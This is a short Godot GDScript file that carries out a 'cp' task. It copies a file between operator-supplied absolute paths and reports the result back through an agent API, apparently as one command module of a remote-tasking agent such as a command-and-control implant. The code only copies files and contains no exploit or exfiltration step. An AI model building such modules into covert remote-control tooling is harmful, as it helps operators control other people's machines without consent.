extends Node

var api

func _ready():
	api = $".".get_parent().get_node("api")


func _on_tasking_cp(task):

	if task.has("command") and task.get("command") == "cp":
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var source = parameters.get("source").simplify_path()
		var destination = parameters.get("destination").simplify_path()
		var ret = DirAccess.copy_absolute(source, destination)

		var output = "Copied %s to %s" % [source, destination]

		if ret != OK:
			output = "Failed to copy %s to %s" % [source, destination]

		api.send_agent_response(
			api.create_task_response(
				ret == OK,
				true,
				task.get("id"),
				output
			)
		)
	else:
		pass
		# TODO: error state
